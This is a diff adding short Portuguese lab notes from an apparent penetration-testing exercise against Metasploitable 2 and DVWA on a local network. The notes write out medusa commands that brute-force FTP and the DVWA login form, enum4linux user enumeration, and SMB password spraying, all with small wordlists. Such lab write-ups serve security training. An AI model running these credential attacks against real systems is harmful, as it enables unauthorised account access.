@@ -1,0 +1,19 @@
+Brute Force no FTP:
+
+"echo -e 'user\nmsfadmin\nadmin\root' > user.txt" para criar a wordlist simples de usuários;
+
+"echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt" para criar a wordlist simples de senhas;
+
+"medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6" foi o comando executado para utilizar as wordlists a fim de atacar a máquina vulnerável para descobrir um login funcional.
+
+Automação de tentativas DVWA:
+
+foram utilizados as mesmas wordlists da etapa anterior
+
+"medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM: 'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6"
+
+Password Spraying em SMB + enumeração de usuários:
+
+"enum4linux -a 192.168.56.101 | tee enum4_output.txt" foi o comando executado para extrair a lista de usuários presentes no sistema do Metasploitable 2 através da enumeração de usuários e copiá-la para um arquivo de texto.
+
+"medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50" foi o comando executado para crackear um login funcional na máquina alvo utilizando smbclient.
